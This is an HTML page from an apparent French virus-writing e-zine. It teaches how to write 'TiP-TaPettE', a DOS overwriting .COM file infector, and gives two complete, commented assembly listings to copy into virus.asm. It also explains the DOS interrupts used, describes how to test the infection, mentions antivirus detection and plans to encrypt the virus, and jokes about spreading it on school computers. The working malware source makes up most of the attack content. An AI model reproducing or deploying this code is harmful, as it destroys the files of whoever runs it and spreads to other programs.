@@ -1,0 +1,272 @@
+<html>
+<head>
+<title>TiP-TaPettE</title>
+</head>
+
+<body background="stars.jpg" bgcolor=black link=#006699 alink=#006699 vlink=#006699>
+<center>
+<img src="logo.jpg" >
+
+<br><br>
+<a href="vupdate.html"><img alt="Virus Update"  src="prev.gif" ></a>&nbsp;
+<a href="sommaire.html"><img alt="Sommaire"  src="toc.gif" ></a>&nbsp;
+<a href="virus3.html"><img alt="Infection dans les regles"  src="next.gif"></a> 
+
+
+<br><br></center>
+
+<center>
+<table border> 
+<td width=650>
+<br>
+<FONT FACE="tahoma,verdana" size=2 color=green>
+<h1 align=center><font size=5 color=gray FACE="tahoma,Verdana">TiP-TaPettE</font></h1><br>
+<b>
+Maintenant qu'on a les bases suffisantes en asm, on va creer notre (mon) infecteur de fichier *.com<br>
+Il se nommera TiP-TaPettE et sera un virus merdique. (car c'est un infecteur de .com et de plus il ecrase le fichier donc totalement pourri !lol)<br>
+Mais bon, faut bien commencer par quelquechose.<br><br>
+
+<font size=2 color=#006699>
+Detail du fonctionnement:<br>
+********************
+</font><pre><font face=tahoma size=2>fichier avant :
+<font size=2 color=#ff0000>
+|-------------------------|
+|       programme        |
+|-------------------------|
+</font>
+fichier infecté :
+<font size=2 color=#ff0000>
+|-------------------------|
+|  Virus | gramme       |
+|-------------------------|
+</font></pre>
+Le com infecte sera donc carrement inutilisable et le virus ne se repandra
+que dans la directory de depart mais bon, encore une fois c'est juste pour apprendre.<br><br>
+<font size=2 color=#006699>
+Procede de l'infection:<br>
+******************<br><br>
+</font>
+-Chercher un com dans la directory<br>
+-Si il y en a un, on l'ouvre<br>
+-Puis on inscrit le virus dedans<br>
+-On ferme le fichier<br>
+-On n'en cherche un autre<br>
+-Si on en trouve un on recommence<br><br>
+
+On voit donc que le virus est si con qu'il verifie meme pas si le com est deja infecte.<br><br>
+<font size=2 color=#006699>
+Allez un peu de source :<br>
+*******************<br><br>
+</font>
+
+pour ouvrir un fichier:<br><br>
+<font size=3 color=#ffcc00><pre>
+---------------------------------------------------------------- 
+l'interruption 21h code 3Dh 
+pour l'appeler :
+
+mettre en ah : 3Dh
+       en dx : l'offset ou il y a le nom du fichier
+               (finissant par un 0)
+puis   int 21h pour appeler l'interruption
+note : renvoie le handle du fichier en ax
+
+----------------------------------------------------------------
+</pre></font>
+pour ecrire dans un fichier:<br><br>
+<font size=3 color=#ffcc00><pre>
+---------------------------------------------------------------- 
+l'interruption 21h code 40h 
+pour l'appeler :
+
+mettre en ah : 40h
+       en bx : le handle du fichier
+       en cx : le nombre d'octets a ecrire
+       en dx : adresse du buffer source
+
+puis   int 21h pour appeler l'interruption
+
+----------------------------------------------------------------
+</pre></font>
+pour fermer un fichier:<br><br>
+<font size=3 color=#ffcc00><pre>
+---------------------------------------------------------------- 
+l'interruption 21h code 3Eh 
+pour l'appeler :
+
+mettre en ah : 3Eh
+       en bx : le handle du fichier a fermer
+
+puis   int 21h pour appeler l'interruption
+
+----------------------------------------------------------------
+</pre></font>
+<font size=2 color=#006699>
+Allez on y go :<br>
+************<br><br>
+</font>
+voici donc le source a copier dans un fichier texte puis a renommer
+en virus.asm
+<font size=3 color=#ff0000><pre>
+*******************************************************************
+
+
+.model small                 ;model de memoire
+.code
+
+ORG 100h                     ;car on fait un fichier com
+
+debut:
+
+   mov ah,4Eh                ;
+   mov dx,offset fichiercom  ;findfirst
+   int 21h                   ;
+
+infection:
+
+   jc fin                    ;si on trouve pas on quitte
+
+   mov ax,3D01h              ;ouverture-du-fichier(le 01 indique qu'on ouvre
+			     ;en ecriture)
+   mov dx,9Eh                ;car nom en 9Eh
+   int 21h
+
+   mov bx,ax                 ;handle en bx
+   mov ah,40h                ;ecriture
+   mov cx,2Dh                ;taille de notre virus
+   mov dx,100h               ;pointe au debut de notre com a recopier dans l'autre
+   int 21h
+
+                             
+   mov ah,3Eh                ;fermeture-du-fichier
+   int 21h
+                             
+   mov ah,4Fh                ;findnext
+   int 21h                   ;si y en a pas on se casse
+   jmp infection             ;si y en a on revient
+
+
+fin:
+
+   ret                       ;fini
+
+   fichiercom db '*.COM',0   ;a la fin car c'est un .com
+
+END debut
+
+*******************************************************************
+</font></pre>
+<br>
+Puis la phase de test.<br>
+Mais comment tester notre virus ? Eh bien on se cree un repertoire test
+puis on met notre virus dedans.<br>
+Ensuite on cree un .com qu'on remplit avec le bloc note.<br>
+Et on lance le virus. Apres ca on regarde l'hexa du .com pour voir si
+il a bien ete infecte. Si c'est le cas on efface virus.com et on cree
+un autre com rempli au notepad. Puis on lance le fichier infecte.<br>
+Si il infecte l'autre alors on a gagné !
+
+Mais bon notre virus il est foireux quand meme. On va essayer de faire
+en sorte qu'un fichier infecte envoie un message par le dos.<br>
+genre :"tu es la victime du virus TiP-GeNoCiDE, bonne journee !".<br><br>
+
+Allez on se met a l'oeuvre :<br><br>
+
+Voici le source qui ferait cela :<br><br>
+
+<font size=2 color=#006699>
+TiP-TaPettE virus<br>
+*****************<br><br>
+</font>
+<font size=3 color=#ff0000><pre>
+**************************** TiP-TaPettE **************************
+
+
+
+.model small                 ;model de memoire
+.code
+
+ORG 100h                     ;car on fait un fichier com
+
+debut:
+
+   mov ah,4Eh               ; 
+   mov dx,offset fichiercom ;findfirst
+   int 21h                  ;
+
+infection:
+
+   jc fin                   ;si on trouve pas on quitte
+
+   mov ax,3D01h             ;ouverture-du-fichier(le 01 indique qu'on ouvre 
+			    ;en ecriture)
+   mov dx,9Eh               ;car nom en 9Eh
+   int 21h
+
+   mov bx,ax                ;handle en bx
+   mov ah,40h               ;ecriture
+   mov cx,70h               ;taille de notre virus (beh voui il est plus gros)
+   mov dx,100h              ;pointe au debut de notre com a recopier dans l'autre
+   int 21h
+
+                            ;fermeture-du-fichier
+   mov ah,3Eh
+   int 21h
+                             
+   mov ah,4Fh               ;findnext
+   int 21h                  ;si y en a pas on se casse
+   jmp infection            ;si y en a on revient
+
+
+fin:
+
+   mov dx,offset chaine     ;message en dx
+   push ax                  ;on sauve ax car il est modifie
+   mov ax,0900h             ;affichage du message
+   int 21h
+   pop ax                   ;on restaure ax
+
+   ret                      ;fini
+
+   fichiercom db '*.COM',0  ;a la fin car c'est un .com
+   chaine db 'tu es la victime du virus TiP-TaPettE, bonne journee !$'
+
+END debut
+
+
+*******************************************************************
+</font></pre>
+Bon on le teste. Arf j'en reviens pas, y marche du premier coup, c'est kewl.<br>
+Ce virus est quand meme une sacree grosse daube mais bon je suis content
+quand meme.<br>
+Cependant n'esperez pas niquer la planete avec vu le mal qu'il a a se 
+repandre !lol.
+La prochaine fois (si il y en a une on fera un vrai virus).<br><br>
+Tiens en passant on va l'analyser avec anti viral toolkit pro pour voir (j'ai pas norton
+sur moi.).Hehe il est reconnu direct ! lol. J'essayerais de le crypter pour voir.
+
+J'espere que vous aurez autant de plaisir a lire cet article que j'en ai eu a le faire.<br>
+Sur ce, bonne programmation.<br><br>
+
+ps-lol: Et si je le mettais sur les PCs de mon etablissement scolaire !...:))
+
+
+
+</b>
+<br><br>
+<DIV ALIGN="right"><font size=+1 color="#006699">Tipiax</font></DIV><br>
+
+
+</font></table></center><br>
+
+<center>
+<a href="vupdate.html"><img alt="Virus Update"  src="prev.gif" ></a>&nbsp;
+<a href="sommaire.html"><img alt="Sommaire"  src="toc.gif" ></a>&nbsp;
+<a href="virus3.html"><img alt="Infection dans les regles"  src="next.gif"></a>
+
+</center>
+
+</body>
+
+</html>
